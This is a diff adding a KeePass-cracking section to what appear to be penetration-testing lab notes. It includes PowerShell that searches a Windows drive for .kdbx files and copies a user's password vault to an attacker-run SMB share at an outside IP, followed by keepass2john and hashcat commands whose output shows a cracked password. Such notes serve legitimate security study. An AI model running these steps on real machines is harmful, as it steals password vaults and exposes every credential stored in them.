@@ -186,7 +186,40 @@ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt netntlmv2.tx
 
 # show cracked results
 john --show hashes.txt
+
+# Keepass
+keepass2john Passwords.kdbx > keepass.hash 
 ```
+
+e.g. keepass cracking
+
+```bash
+impacket-smbserver test . -smb2support -username kira -password kira   
+```
+
+```powershell
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue                                                     
+net use m: \\192.168.45.219\TEST /user:kira kira
+copy C:\Users\alice\Desktop\Passwords.kdbx m:\
+```
+
+```bash
+└─$ ls -la Passwords.kdbx
+└─$ keepass2john Passwords.kdbx > keepass.hash 
+└─$ cat keepass.hash
+Passwords:$keepass$*REDACTED_HASH
+
+# erase Passwords: to match hashcat format
+└─$ cat keepass.hash
+$keepass$*REDACTED_HASH
+
+└─$ sudo hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
+
+└─$ sudo hashcat -m 13400 keepass.hash /usr/share/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule --force 
+
+$keepass$*REDACTED_HASH:password_cracked
+```
+
 
 
 ---
